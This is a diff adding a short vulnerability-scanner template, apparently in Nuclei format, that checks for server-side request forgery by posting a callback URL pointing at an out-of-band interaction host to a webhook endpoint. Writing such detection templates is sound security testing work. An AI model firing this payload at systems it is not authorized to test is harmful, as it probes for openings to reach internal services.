@@ -1,0 +1,15 @@
+id: K70n0s510-ssrf-webhook
+info:
+  name: SSRF via Webhook Configuration
+  author: K70n0s510
+  severity: high
+  tags: a10,ssrf
+http:
+  - method: POST
+    path: ["{{BaseURL}}/api/webhook"]
+    body: '{"callback_url":"http://{{interactsh-url}}"}'
+    headers: {Content-Type: application/json}
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words: ["http"]
